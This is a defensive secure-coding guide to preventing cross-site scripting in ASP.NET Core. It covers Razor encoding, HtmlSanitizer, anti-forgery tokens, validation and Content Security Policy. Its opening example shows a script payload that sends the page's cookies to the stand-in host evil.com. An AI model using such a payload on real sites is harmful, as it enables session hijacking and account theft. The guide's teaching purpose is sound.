# XSS Prevention Guide

## What is XSS?

**Cross-Site Scripting (XSS):** Security vulnerability where attackers inject malicious JavaScript through user input.

**Example Attack:**
```html
<script>document.location='http://evil.com?cookie='+document.cookie</script>
```

**Dangers:** Steal cookies, hijack accounts, redirect users, modify page content

## ASP.NET Core Protection

**Good news:** ASP.NET Core automatically encodes HTML by default.

### Automatic Encoding

```csharp
var userInput = "<script>alert('XSS')</script>";
```

```html
<!-- Razor automatically encodes (SAFE) -->
<p>@userInput</p>

<!-- Browser sees -->
<p>&lt;script&gt;alert('XSS')&lt;/script&gt;</p>
```

Script displays as text, doesn't execute!

## The Danger: @Html.Raw()

```html
<!-- ❌ DANGEROUS: No encoding -->
<div>@Html.Raw(Model.UserComment)</div>
```

**Only use `@Html.Raw()` for:**
- Admin-generated content (trusted)
- Pre-sanitized HTML (after sanitization library)
- Your own controlled content

## Safe HTML Handling

### Option 1: Plain Text (Default)

```html
<!-- Always safe -->
<p>@Model.UserInput</p>
```

### Option 2: HTML Sanitization

```bash
dotnet add package HtmlSanitizer
```

```csharp
using Ganss.Xss;

public class BlogPostModel : PageModel
{
    private readonly HtmlSanitizer _sanitizer;
    
    public BlogPostModel()
    {
        _sanitizer = new HtmlSanitizer();
        _sanitizer.AllowedTags.Clear();
        _sanitizer.AllowedTags.Add("p");
        _sanitizer.AllowedTags.Add("strong");
        _sanitizer.AllowedTags.Add("em");
    }
    
    public IActionResult OnPost()
    {
        // Sanitize before saving
        var safe = _sanitizer.Sanitize(Content);
        SavePost(safe);
        return Page();
    }
}
```

```html
<!-- Now safe to use Raw on sanitized content -->
<div>@Html.Raw(Model.SanitizedContent)</div>
```

## Anti-Forgery Tokens

Protects against CSRF attacks. Razor Pages includes automatically:

```html
<form method="post">
    <!-- Token automatically added -->
    <input name="Name" />
    <button type="submit">Submit</button>
</form>
```

## Input Validation

```csharp
[BindProperty]
[Required]
[StringLength(500)]
[RegularExpression(@"^[a-zA-Z0-9\s.,!?'-]*$", 
    ErrorMessage = "Only letters, numbers, and basic punctuation allowed")]
public string Comment { get; set; }

public IActionResult OnPost()
{
    if (!ModelState.IsValid)
        return Page();
    
    // Additional check
    if (Comment.Contains("<script>", StringComparison.OrdinalIgnoreCase))
    {
        ModelState.AddModelError("Comment", "Invalid characters");
        return Page();
    }
    
    SaveComment(Comment);
    return RedirectToPage();
}
```

## Content Security Policy

```csharp
// Program.cs
app.Use(async (context, next) =>
{
    context.Response.Headers.Add("Content-Security-Policy", 
        "default-src 'self'; script-src 'self';");
    await next();
});
```

Blocks inline scripts from user input.

## Best Practices

✅ **Do:**
- Use automatic encoding (default Razor)
- Validate all user input server-side
- Sanitize HTML with trusted library
- Use anti-forgery tokens
- Implement Content Security Policy

❌ **Don't:**
- Use `@Html.Raw()` on user input
- Trust client-side validation only
- Disable anti-forgery tokens
- Store unsanitized HTML

## Security Checklist

Before deploying:

- [ ] All user input validated server-side
- [ ] No `@Html.Raw()` on user content
- [ ] Anti-forgery tokens enabled
- [ ] Content Security Policy configured
- [ ] XSS test payloads blocked

## Quick Reference

```html
<!-- ✅ SAFE: Automatic encoding -->
<p>@Model.UserInput</p>

<!-- ❌ DANGEROUS: No encoding -->
<p>@Html.Raw(Model.UserInput)</p>

<!-- ✅ SAFE: Sanitized first -->
<p>@Html.Raw(Model.SanitizedHtml)</p>
```
